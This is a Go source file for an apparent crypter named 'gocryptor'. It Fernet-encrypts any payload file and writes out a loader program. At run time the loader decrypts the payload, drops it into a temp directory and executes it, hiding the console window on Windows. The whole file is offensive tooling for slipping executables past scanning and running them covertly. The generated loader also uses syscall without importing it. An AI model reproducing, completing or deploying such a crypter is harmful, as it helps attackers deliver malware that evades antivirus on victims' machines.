package main

import (
	"encoding/base64"
	"fmt"
	"github.com/fernet/fernet-go"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"text/template"
)

// GenerateRandomKey generates a new Fernet key
func GenerateRandomKey() (*fernet.Key, error) {
	var key fernet.Key
	err := key.Generate()
	if err != nil {
		return nil, err
	}
	return &key, nil
}

// Encrypt the payload using the provided key
func encrypt(payload []byte, key *fernet.Key) (string, error) {
	token, err := fernet.EncryptAndSign(payload, key)
	if err != nil {
		return "", err
	}
	return string(token), nil
}

// Encode the key as a base64 string
func encodeKey(key *fernet.Key) string {
	return base64.StdEncoding.EncodeToString(key[:]) // Key is byte slice, no need for string conversion
}

// Create a new payload file with the encrypted token
func createPayload(token string, encodedKey string, outputName string) error {
	payloadTemplate := `
package main

import (
	"encoding/base64"
	"github.com/fernet/fernet-go"
	"io/ioutil"
	"os"
	"os/exec"
	"runtime"
)

func decodeKey(key string) (*fernet.Key, error) {
	// Decode the base64 encoded key back into bytes
	decodedKey, err := base64.StdEncoding.DecodeString(key)
	if err != nil {
		return nil, err
	}
	// Decode the key into a *fernet.Key object
	var keyObj fernet.Key
	copy(keyObj[:], decodedKey) // Manually copy the decoded bytes into the fernet key struct
	return &keyObj, nil
}

func main() {
	token := "{{.Token}}"
	key := "{{.Key}}"

	// Decode the key using the decodeKey function
	keyObj, err := decodeKey(key)
	if err != nil {
		os.Exit(1)
	}

	// Decrypt the payload
	payload := fernet.VerifyAndDecrypt([]byte(token), 0, []*fernet.Key{keyObj})
	if payload == nil {
		os.Exit(1) // Exit if decryption failed
	}

	// Save the payload to the appropriate directory based on the OS
	var outputPath string
	if runtime.GOOS == "windows" {
		outputPath = "C:/Windows/Temp/{{.OutputName}}"
	} else {
		outputPath = "/tmp/{{.OutputName}}"
	}

	// Write the payload to a file
	err = ioutil.WriteFile(outputPath, payload, 0755)
	if err != nil {
		os.Exit(1)
	}

	// Execute the decrypted payload
	cmd := exec.Command(outputPath)

	// On Windows, set the sysProcAttr to hide the console window
	if runtime.GOOS == "windows" {
		cmd.SysProcAttr = &syscall.SysProcAttr{
			CreationFlags: syscall.CREATE_NO_WINDOW, // This hides the console window
		}
	}

	if err := cmd.Start(); err != nil {
		os.Exit(1)
	}

}

`

	t, err := template.New("payload").Parse(payloadTemplate)
	if err != nil {
		return err
	}

	output := struct {
		Token      string
		Key        string
		OutputName string
	}{
		Token:      token,
		Key:        encodedKey, // Pass the base64 encoded key
		OutputName: outputName,
	}

	file, err := os.Create("new_payload.go")
	if err != nil {
		return err
	}
	defer file.Close()

	if err := t.Execute(file, output); err != nil {
		return err
	}

	return nil
}

func main() {
	if len(os.Args) < 2 {
		log.Fatal("Usage: gocryptor <path_to_payload>")
	}

	payloadPath := os.Args[1]
	payload, err := ioutil.ReadFile(payloadPath)
	if err != nil {
		log.Fatal(err)
	}

	key, err := GenerateRandomKey()
	if err != nil {
		log.Fatal(err)
	}

	encodedKey := encodeKey(key) // Use the encoded key (string)

	token, err := encrypt(payload, key)
	if err != nil {
		log.Fatal(err)
	}

	outputName := filepath.Base(payloadPath)

	if err := createPayload(token, encodedKey, outputName); err != nil {
		log.Fatal(err)
	}

	fmt.Println("New payload created: new_payload.go")
}
